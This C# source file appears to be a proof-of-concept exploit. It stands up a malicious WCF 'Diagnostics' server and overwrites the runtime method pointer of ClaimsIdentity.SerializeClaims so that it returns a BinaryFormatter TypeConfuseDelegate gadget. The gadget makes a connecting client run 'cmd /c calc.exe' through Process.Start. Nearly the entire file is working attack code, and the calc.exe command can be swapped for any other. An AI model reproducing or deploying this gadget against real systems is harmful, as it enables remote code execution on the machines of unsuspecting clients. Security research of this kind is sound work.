using RemoteDiagnostics.Contract;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Claims;
using System.ServiceModel;

namespace ServerPOC01
{
    internal class Program
    {
        private static string command = "calc.exe";

        static void Main(string[] args)
        {
            HijackSerializationMethod();

            DiagnosticsBinding binding = new DiagnosticsBinding();
            Uri uri = new Uri("net.tcp://localhost:2024");
            ServiceHost serviceHost = new ServiceHost(typeof(DiagnosticsService), new Uri[]
            {
                uri
            });
            serviceHost.AddServiceEndpoint(typeof(IDiagnostics), binding, "Diagnostics");
            serviceHost.Open();
            Console.WriteLine("[*] Listening...");
            Console.ReadLine();
        }

        string SerializeClaimsHijack()
        {
            Console.WriteLine("[*] Serializing gadget...");

            object gadget = TypeConfuseDelegateGadget(command);
            string ret = null;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                new BinaryFormatter().Serialize(memoryStream, gadget);
                ret = Convert.ToBase64String(memoryStream.GetBuffer(), 0, (int)memoryStream.Length);
            }

            return ret;
        }

        // https://www.infoq.com/articles/overriding-sealed-methods-c-sharp/
        public static void HijackSerializationMethod()
        {
            var source = typeof(ClaimsIdentity).GetMethod("SerializeClaims", BindingFlags.NonPublic | BindingFlags.Instance);
            var target = typeof(Program).GetMethod("SerializeClaimsHijack", BindingFlags.NonPublic | BindingFlags.Instance);

            Console.WriteLine("[*] Hijacking {0} -> {1}", source, target);

            RuntimeHelpers.PrepareMethod(source.MethodHandle);
            RuntimeHelpers.PrepareMethod(target.MethodHandle);

            var sourceMethodDescriptorAddress = source.MethodHandle.Value;
            var targetMethodMachineCodeAddress = target.MethodHandle.GetFunctionPointer();

            Marshal.WriteIntPtr(sourceMethodDescriptorAddress, 1 * IntPtr.Size, targetMethodMachineCodeAddress);
        }

        public static SortedSet<string> TypeConfuseDelegateGadget(string cmd)
        {

            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add("cmd");
            set.Add("/c " + cmd);

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }
    }
}
